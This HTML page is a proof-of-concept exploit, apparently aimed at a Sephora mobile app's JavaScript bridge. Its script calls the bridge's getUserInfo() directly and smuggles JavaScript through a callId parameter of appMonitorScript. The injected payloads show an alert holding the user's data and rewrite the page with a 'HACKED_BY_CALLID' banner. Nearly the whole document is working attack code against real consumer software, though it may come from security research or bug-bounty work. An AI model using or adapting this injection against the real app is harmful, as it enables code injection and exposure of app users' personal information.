<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>PoC</title>
<style>
body{background:#0d0d0d;color:#fff;font-family:monospace;padding:20px;font-size:14px}
.ok{color:#00c853}.err{color:#ff5252}.info{color:#c9a96e}
</style>
</head>
<body>
<h3 style="color:#c9a96e">JSBridge PoC</h3>
<div id="log"></div>
<script>
function L(s,c){document.getElementById('log').innerHTML+='<div class="'+(c||'')+'">'+s+'</div>'}

if(typeof appHandler==='undefined'){
  L('NO BRIDGE - not in sephora app','err');
}else{
  L('bridge: YES','ok');
  L('origin: '+location.origin,'info');

  // 1. getUserInfo (direct)
  var u=appHandler.getUserInfo();
  L('getUserInfo(): "'+u+'"','ok');

  // 2. simple callId injection (just alert - proven to work)
  L('calling getExpFlag with injected callId...','info');
  appHandler.appMonitorScript('getExpFlag',
    "0);alert('INJECTED: user='+appHandler.getUserInfo());//",
    '{"expKey":"test"}');
  L('call sent','info');

  // 3. also try with document.title (simplest DOM change)
  setTimeout(function(){
    appHandler.appMonitorScript('getExpFlag',
      "0);document.title='HACKED_BY_CALLID';document.body.innerHTML+='<div style=\"position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:red;color:white;padding:30px;font-size:20px;border-radius:15px;z-index:99999\">CALLED INJECTION SUCCESS<br>getUserInfo: '+appHandler.getUserInfo()+'</div>';/",
      '{"expKey":"test"}');
  },1500);
}
</script>
</body>
</html>
